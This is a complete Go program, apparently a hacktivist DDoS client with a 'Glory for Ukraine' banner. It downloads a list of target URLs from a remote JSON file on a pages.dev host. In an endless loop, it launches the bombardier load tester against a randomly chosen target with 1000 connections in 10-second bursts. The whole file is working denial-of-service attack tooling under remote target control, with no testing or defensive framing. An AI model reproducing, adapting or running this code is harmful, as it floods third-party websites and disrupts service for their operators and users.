package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"math/rand"
	"time"
	"runtime"
	"path"
	"os"
	"os/exec"
)

// Download and parse targets.json
func loadConfigs(url string) ([]string, error) {
	httpClient := http.Client {
		Timeout: time.Second * 1,
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return []string{}, err
	}

	res, err := httpClient.Do(req)
	if err != nil {
		return []string{}, err
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return []string{}, err
	}

	var configs []string
	err = json.Unmarshal(body, &configs)
	if err != nil {
		return []string{}, err
	}

	return configs, nil
}

func randomItem(items []string) string {
	randomIndex := rand.Intn(len(items))
    return items[randomIndex]
}

// Get possible path to bombardier in cwd/bin/platform folder
func bombardierExecutablePathInBin(currentFolder string) string {
	var result string = ""
    switch runtime.GOOS {
    case "windows":
        result = path.Join(currentFolder, "bin", "win", "bombardier.exe")
    case "darwin":
        result = path.Join(currentFolder, "bin", "mac", "bombardier")
    case "linux":
        result = path.Join(currentFolder, "bin", "linux", "bombardier")
    default:
        log.Fatal("Unsupported OS: ", runtime.GOOS)
    }

	return result
}

// Get possible path to bombardier in cwd folder
func bombardierExecutablePath(currentFolder string) string {
	var result string = ""
    switch runtime.GOOS {
    case "windows":
        result = path.Join(currentFolder, "bombardier.exe")
    case "darwin":
        result = path.Join(currentFolder, "bombardier")
    case "linux":
        result = path.Join(currentFolder, "bombardier")
    default:
        log.Fatal("Unsupported OS: ", runtime.GOOS)
    }

	return result
}

// Get path to bombandier or fail
func bombardierExecutable() string {
	currentFolder, err := os.Getwd()
	if err != nil {
        log.Fatal(err)
    }

	executableFile, err := os.Executable()
    if err != nil {
        log.Fatal(err)
    }
    executableFolder := path.Dir(executableFile)

	if _, err := os.Stat(bombardierExecutablePath(currentFolder)); err == nil {
		return bombardierExecutablePath(currentFolder)
	} else if _, err := os.Stat(bombardierExecutablePathInBin(currentFolder)); err == nil {
		return bombardierExecutablePathInBin(currentFolder)
	} else if _, err := os.Stat(bombardierExecutablePath(executableFolder)); err == nil {
		return bombardierExecutablePath(executableFolder)
	} else if _, err := os.Stat(bombardierExecutablePathInBin(executableFolder)); err == nil {
		return bombardierExecutablePathInBin(executableFolder)
	} else {
		log.Fatal("Unable to find bombardier in: ", currentFolder)
		return ""
	}
}

// Launch process, pipe stdout/err and establish timeout
func launchWithTimeout(timeout time.Duration, binary string, arguments ...string) error {
	cmd := exec.Command(binary, arguments...)

	cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		return err
	}

	// buffered chan is important so the goroutine does't
	// get blocked and stick around if the function returns
	// after the timeout
	done := make(chan error, 1)

	go func() {
		done <- cmd.Wait()
	}()

	select {
	case err := <-done:
		// this will be nil if no error
		return err
	case <-time.After(timeout):
		if err := cmd.Process.Kill(); err != nil {
			return err
		}
		return nil
	}
}

func main() {
	fmt.Println(string("\033[33m"), `
██████████████████████████████
██████████████░░██████████████
████░████████░░░░████████░████
████░░░██████░░░░██████░░░████
████░█░░░█████░░██████░░█░████
████░██░░█████░░█████░░██░████
████░███░░████░░████░░███░████
████░███░░████░░████░░███░████
████░███░░████░░████░░███░████
████░████░░███░░███░░████░████
████░████░░███░░███░░████░████
████░██░░░███░░░░███░░░██░████
████░██░░███░░██░░███░░██░████
████░██░░░██████████░░░██░████
████░████░░░░░██░░░░░████░████
████░█████░░██░░██░░█████░████
████░░░░░░░░░░░░░░░░░░░░░░████
██████████░░██░░██░░██████████
 ██████████░░█░░█░░██████████
  ██████████░░░░░░██████████
    █████████░░░░█████████
      ██████████████████
             ████`,
string("\033[1;33m"),
"\n\nGlory for Ukraine\n",
string("\033[0m"))

	rand.Seed(time.Now().UnixNano())

	var cachedConfigs []string
	for {
		configs, err := loadConfigs("https://gloryforukraine.pages.dev/targets.json")
		if err != nil {
			log.Println(err)
			if len(cachedConfigs) == 0 {
				time.Sleep(2 * time.Second)
				continue
			}
		} else {
			cachedConfigs = configs
		}

		// ensure process timeout is equal to requested timeout from tool
		err = launchWithTimeout(time.Second * 10, bombardierExecutable(), randomItem(cachedConfigs), "--connections=1000")
		if err != nil {
			fmt.Println(err)
		}
	}
}
